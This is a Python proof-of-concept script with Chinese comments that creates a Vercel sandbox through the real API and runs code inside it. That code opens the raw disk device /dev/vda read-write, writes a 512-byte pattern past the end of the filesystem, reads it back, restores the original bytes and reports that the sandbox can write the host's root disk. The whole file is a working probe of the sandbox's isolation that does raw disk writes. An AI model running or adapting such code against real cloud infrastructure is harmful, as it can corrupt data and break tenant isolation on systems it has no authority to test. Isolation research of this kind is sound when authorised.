# 实验J37b: vda 写能力测试 (修正版) - 512B 精确模式, 完整证据链
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj37b"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, struct

f = open("/dev/vda", "rb", buffering=0)
f.seek(0)
sb = f.read(512)
bs = struct.unpack_from(">I", sb, 0x04)[0]
dblocks = struct.unpack_from(">Q", sb, 0x08)[0]
f.seek(0, 2)
real_size = f.tell()
fs_end = dblocks * bs
print("magic=%r bs=%d dblocks=%d real=%d fs_end=%d outside=%d"
      % (sb[:4], bs, dblocks, real_size, fs_end, real_size - fs_end), flush=True)

tgt = fs_end + ((real_size - fs_end) // 2)
tgt -= tgt % 512
print("target = %d (0x%x)" % (tgt, tgt), flush=True)

f.seek(tgt)
orig = f.read(512)
print("orig[0:32]: %r (all-zero=%s)" % (orig[:32], orig == b"\x00" * 512), flush=True)

fd = os.open("/dev/vda", os.O_RDWR)
print("open O_RDWR: OK", flush=True)

# 512B 精确模式: bytes(0..255) 重复 2 次 = 512B
pattern = bytes(range(256)) * 2
assert len(pattern) == 512, len(pattern)
os.lseek(fd, tgt, os.SEEK_SET)
n = os.write(fd, pattern)
print("wrote %d bytes (expect 512)" % n, flush=True)
os.fsync(fd)
print("fsync: OK", flush=True)

f.seek(tgt)
rb = f.read(512)
same = (rb == pattern)
print("READBACK match: %s" % same, flush=True)
if not same:
    print("readback[0:32]: %r" % rb[:32], flush=True)

os.lseek(fd, tgt, os.SEEK_SET)
os.write(fd, orig)
os.fsync(fd)
os.close(fd)
print("restored orig, fsync OK", flush=True)

f.seek(tgt)
rb2 = f.read(512)
restored = (rb2 == orig)
print("RESTORE match: %s" % restored, flush=True)

print("===== 交叉验证: 目标偏移前后各 1KB 未受影响 =====", flush=True)
for base in (tgt - 512, tgt + 512):
    f.seek(base)
    d = f.read(512)
    print("  @%d zero=%s" % (base, d == b"\x00" * 512), flush=True)

if same and restored:
    print("RESULT: WRITE_OK - sandbox CAN WRITE host rootfs disk (vda), restore clean", flush=True)
else:
    print("RESULT: AMBIGUOUS same=%s restored=%s" % (same, restored), flush=True)
'''
run_cmd(sid, SCAN, "vda-write-test-v2", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
